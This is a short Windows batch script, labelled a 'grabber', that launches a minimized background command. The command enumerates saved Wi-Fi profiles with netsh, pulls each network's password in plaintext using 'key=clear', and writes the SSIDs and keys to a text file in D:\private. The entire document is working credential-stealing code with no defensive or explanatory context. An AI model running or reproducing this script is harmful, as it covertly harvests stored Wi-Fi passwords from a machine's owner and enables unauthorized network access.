:: Create target folder if needed
if not exist "D:\private" mkdir "D:\private"

:: Background grabber, skips first 9 entries
start /min cmd /c ^
"for /f "skip=9 tokens=1,2 delims=:" %%i in ('netsh wlan show profiles') do @if "%%j" NEQ "" (echo SSID: %%j >> D:\private\DeTA.txt & netsh wlan show profiles %%j key=clear | findstr "Key Content" >> D:\private\DeTA.txt & echo. >> D:\private\DeTA.txt)
